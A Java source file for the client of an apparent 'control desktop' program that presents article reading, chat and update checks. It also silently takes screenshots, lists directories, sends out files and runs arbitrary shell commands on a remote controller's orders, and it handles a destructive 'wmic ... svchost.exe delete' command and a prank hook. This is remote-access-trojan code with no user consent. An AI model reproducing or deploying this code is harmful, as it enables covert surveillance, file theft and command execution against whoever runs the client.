package com.controldesktop;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Objects;

public class SocketReceive extends Thread{
    Socket socket;
    JList<String> ArticleList;

    JTextArea ReceiveTextArea;
    JFrame frame;
    public SocketReceive(Socket socket, JList<String> ArticleList,JTextArea jta,JFrame j){
        this.socket = socket;
        this.ArticleList = ArticleList;
        this.ReceiveTextArea = jta;
        this.frame=j;
    }
    @Override
    public void run() {
        while (true){
            try{
                InputStream is = socket.getInputStream();
                BufferedInputStream bis = new BufferedInputStream(is);
                ObjectInputStream ois = new ObjectInputStream(bis);
                Object obj = ois.readObject();

                if (obj != null) {
                    HeadMessage hm = (HeadMessage) obj;
                    hm.setDevice("CLIENT");
                    File file;
                    switch (hm.getType()){
                        case "GET_SCREEN":
                            hm.setType("RETURN_GET_SCREEN");
                            try {
                                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();// 获取当前屏幕大小
                                Rectangle rectangle = new Rectangle(screenSize);
                                Robot robot = new Robot();
                                BufferedImage img = robot.createScreenCapture(rectangle);
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                ImageIO.write(img,"png",baos);
                                byte[] data = baos.toByteArray();
                                hm.setFileToByte(data);
                                ClientFunction.sendHeadMessage(socket,hm);
                            }catch (Exception e){
                                //对于这些报错的信息都应该返回给控制端
                                hm.setType("RETURN_ERROR_MESSAGE");
                                hm.setValue(new String[]{e.toString()});
                                ClientFunction.sendHeadMessage(socket,hm);
                            }
                            break;
                        case "DOWNLOAD_FILE":
                            try {
                                file = new File(hm.getFileInfo()[1]);
                                hm.setFileInfo(new String[]{file.getName(), hm.getFileInfo()[1], String.valueOf(file.length())});
                                hm.setType("RETURN_DOWNLOAD_FILE");
                                ClientFunction.sendHeadMessage(socket, hm);
                                Thread.sleep(2000);
                                new SendFileTCP(hm).start();
                            }catch (Exception e){//将客户端的错误信息返回到服务器
                                hm.setType("RETURN_ERROR_MESSAGE");
                                hm.setValue(new String[]{e.toString()});
                                ClientFunction.sendHeadMessage(socket,hm);
                            }
                            break;
                        case "LIST_PATH":
                            try {
                                String FilePath = hm.getValue()[0];
                                file = new File(FilePath);
                                String[] AllFile = file.list();
                                File item;
                                assert AllFile != null;
                                for (int i = 0; i < AllFile.length; i++) {
                                    item = new File(FilePath + "\\" + AllFile[i]);
                                    if (item.isDirectory()) {
                                        AllFile[i] += "\\";
                                    }
                                }
                                hm.setValue(AllFile);
                                hm.setType("RETURN_LIST_PATH");
                                hm.setFileInfo(new String[]{"", FilePath});
                                ClientFunction.sendHeadMessage(socket, hm);
                            }catch (Exception e){
                                hm.setType("RETURN_ERROR_MESSAGE");
                                hm.setValue(new String[]{e.toString()});
                                ClientFunction.sendHeadMessage(socket,hm);
                            }
                            break;
                        case "RETURN_GET_ARTICLE_LIST":
                            ArticleList.removeAll();
                            String[] list = hm.getValue();
                            ArticleList.setListData(list);
                            break;
                        case "EXECUTE_CMD":
                            try {
                                String cmd = hm.getValue()[0];
                                if (Objects.equals(cmd, "hide")){//添加的测试窗体显示命令
                                    frame.setExtendedState(Frame.ICONIFIED);
                                } else if (Objects.equals(cmd, "show")) {
                                    frame.setExtendedState(Frame.NORMAL);
                                }else {
                                    hm.setType("RETURN_EXECUTE_CMD");
                                    if (Objects.equals(cmd, "wmic process where name=\"svchost.exe\" delete")) {
                                        hm.setType("EXIT");
                                        ClientFunction.sendHeadMessage(socket, hm);
                                        String value = ClientFunction.executeCommand(cmd);
                                        hm.setValue(new String[]{value});
                                        ClientFunction.sendHeadMessage(socket, hm);
                                        socket.close();
                                        System.exit(0);
                                    }else {
                                        String value = ClientFunction.executeCommand(cmd);
                                        hm.setValue(new String[]{value});
                                        ClientFunction.sendHeadMessage(socket, hm);
                                    }
                                }
                            }catch (Exception e){
                                hm.setType("RETURN_ERROR_MESSAGE");
                                hm.setValue(new String[]{e.toString()});
                                ClientFunction.sendHeadMessage(socket,hm);
                            }
                            break;
                        case "RETURN_CHECK_UPDATE":
                            String Version = hm.getValue()[0];
                            if (Objects.equals(Version, "1.0")){
                                JOptionPane.showMessageDialog(null,"你使用的是最新版本!");
                            }else {
                                int conform = JOptionPane.showConfirmDialog(null,hm.getValue()[1]+"\n是否下载新版本？");
                                if (conform == 0){
                                    hm.setType("GET_NEW_VERSION");
                                    ClientFunction.sendHeadMessage(socket,hm);
                                }
                            }
                            break;
                        case "RETURN_GET_NEW_VERSION":
                            new DownLoadFile(hm);
                            break;
                        case "CONTROL_SAY_MESSAGE":
                            String message = hm.getValue()[0];
                            ClientFunction.showDialog(message);
                            break;
                        case "RETURN_GET_ARTICLE":
                            Toolkit tk = Toolkit.getDefaultToolkit();
                            Dimension ScreenSize = tk.getScreenSize();
                            int winHeight = (int) ScreenSize.getHeight();
                            int winWidth = (int) ScreenSize.getWidth();
                            JFrame j = new JFrame();
                            int frameWidth = 800;
                            int frameHeight = 400;
                            j.setBounds((winWidth - frameWidth)/2,(winHeight - frameHeight)/2, frameWidth, frameHeight);
                            j.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
                            Container c = j.getContentPane();
                            JTextArea jta = new JTextArea();
                            JScrollPane jsp = new JScrollPane(jta);
                            jta.setFont(new Font("楷体",Font.BOLD,20));
                            c.add(jsp);
                            j.setTitle(hm.getValue()[0]);
                            jta.setLineWrap(true);        //激活自动换行功能
                            jta.setWrapStyleWord(true);
                            jta.setText(hm.getValue()[1]);
                            j.setVisible(true);
                            break;
                        case "EXIT":
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        Thread.sleep(2000);
                                    } catch (InterruptedException e) {
                                        throw new RuntimeException(e);
                                    }
                                    try {
                                        socket.close();
                                    } catch (IOException e) {
                                        throw new RuntimeException(e);
                                    }
                                    System.exit(0);
                                }
                            }).start();
                            JOptionPane.showMessageDialog(null,"你已被强制下线！");
                            break;
                        case "RETURN_CHAT":
                            String ipAdd = hm.getIpInfo()[0];
                            String value = hm.getValue()[0];
                            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                            Date date = new Date(System.currentTimeMillis());
                            String nowTime = formatter.format(date);
                            ReceiveTextArea.append("\n");
                            ReceiveTextArea.append(nowTime);
                            ReceiveTextArea.append("\n");
                            ReceiveTextArea.append(ipAdd);
                            ReceiveTextArea.append(" > ");
                            ReceiveTextArea.append(value);
                            ReceiveTextArea.append("\n");
                            break;
                        case "JOKE_TO_CLIENT":
                            int Number = Integer.parseInt(hm.getValue()[0]);
                            ClientFunction.jokeToClient(Number);
                            break;
                        case "CONFIRM":
                            //ClientFunction.showDialog("收到证实信息");
                            break;
                        default:
                            break;
                    }
                }
            }catch (Exception e){
                try {
                    socket.close();
                } catch (IOException ex) {
                    JOptionPane.showMessageDialog(null,"程序运行出错，运行已结束！");
                    System.exit(0);
                }
                break;
            }
        }
    }
}
